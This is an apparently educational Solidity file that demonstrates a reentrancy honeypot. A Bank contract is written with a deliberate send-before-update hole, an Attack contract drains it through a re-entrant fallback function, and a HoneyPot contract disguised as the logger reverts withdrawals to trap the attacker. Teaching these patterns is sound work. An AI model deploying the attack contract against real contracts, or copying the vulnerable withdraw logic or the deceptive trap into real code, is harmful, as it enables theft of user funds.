pragma solidity ^0.5.16;
/*
https://www.reddit.com/r/ethdev/comments/7x5rwr/tricked_by_a_honeypot_contract_or_beaten_by/
https://www.reddit.com/r/ethdev/comments/7xu4vr/oh_dear_somebody_just_got_tricked_on_the_same/dubakau/
https://etherscan.io/address/0x95d34980095380851902ccd9a1fb4c813c2cb639#code
*/

contract Bank {
    mapping (address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) public {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value,"Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");
        
        (bool sent, ) = msg.sender.call.value(_amount)("");
        require(sent, "Failed to send Ether");
        
        balances[msg.sender] -= _amount;
        
        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}

// Hacker tries to drain the Ethers stored in Bank by reentrancy.
contract Attack {
    Bank bank;
    
    constructor(Bank _bank) public {
        bank = Bank(_bank);
    }
    
    function () external payable {
        if (address(bank).balance > 0) {
            bank.withdraw(1 ether);
        }
    }
    
    function attack() public payable {
        bank.deposit.value(1 ether)();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract HoneyPot {
    function log(address _caller, uint _amount, string memory _action) public {
        if (equal(_action, "Withdraw")) {
            // revert();
            require(false, "Withdraw denied");
        }
    }
    
    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
